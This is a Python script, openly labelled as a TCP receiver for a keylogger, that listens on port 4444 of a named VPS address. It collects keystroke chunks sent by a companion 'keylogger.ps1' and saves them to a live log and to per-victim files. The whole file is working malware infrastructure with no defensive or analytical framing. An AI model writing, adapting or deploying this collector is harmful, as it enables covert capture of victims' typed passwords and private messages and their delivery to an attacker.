#!/usr/bin/env python3
"""TCP keylog receiver for 89.22.229.54:4444 (or any bind).

Listens for plain UTF-8 chunks from keylogger.ps1, writes:
  logs/live.log          - continuous append
  logs/YYYYMMDD_HHMMSS_IP.bin.txt - per connection chunk

Run on the VPS:
  python3 receiver.py
  # or: KL_PORT=4444 KL_OUT=./logs python3 receiver.py
"""
from __future__ import annotations

import os
import socket
import socketserver
import threading
from datetime import datetime, timezone
from pathlib import Path

HOST = os.environ.get("KL_HOST", "0.0.0.0")
PORT = int(os.environ.get("KL_PORT", "4444"))
OUT = Path(os.environ.get("KL_OUT", "logs"))
MAX_CHUNK = 1_000_000  # fail closed on absurd size
READ_TIMEOUT = 30.0


class Handler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        peer = self.client_address[0]
        self.request.settimeout(READ_TIMEOUT)
        buf = bytearray()
        try:
            while True:
                try:
                    block = self.request.recv(8192)
                except socket.timeout:
                    break
                if not block:
                    break
                buf.extend(block)
                if len(buf) > MAX_CHUNK:
                    buf = buf[:MAX_CHUNK]
                    break
        except OSError:
            pass

        if not buf:
            return

        ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        safe_ip = peer.replace(":", "_")
        OUT.mkdir(parents=True, exist_ok=True)
        chunk_path = OUT / f"{ts}_{safe_ip}.txt"
        live_path = OUT / "live.log"
        header = f"\n--- {ts} utc from {peer} ({len(buf)} bytes) ---\n".encode("utf-8")

        try:
            chunk_path.write_bytes(bytes(buf))
            with live_path.open("ab") as f:
                f.write(header)
                f.write(buf)
                f.flush()
        except OSError as e:
            # fail closed: drop connection after best-effort stderr
            try:
                print(f"write fail {peer}: {e}", flush=True)
            except Exception:
                pass
            return

        try:
            print(f"ok {peer} {len(buf)}B -> {chunk_path.name}", flush=True)
        except Exception:
            pass


class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    srv = ThreadedServer((HOST, PORT), Handler)
    print(f"listening {HOST}:{PORT} out={OUT.resolve()}", flush=True)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("stop", flush=True)
    finally:
        srv.server_close()


if __name__ == "__main__":
    main()
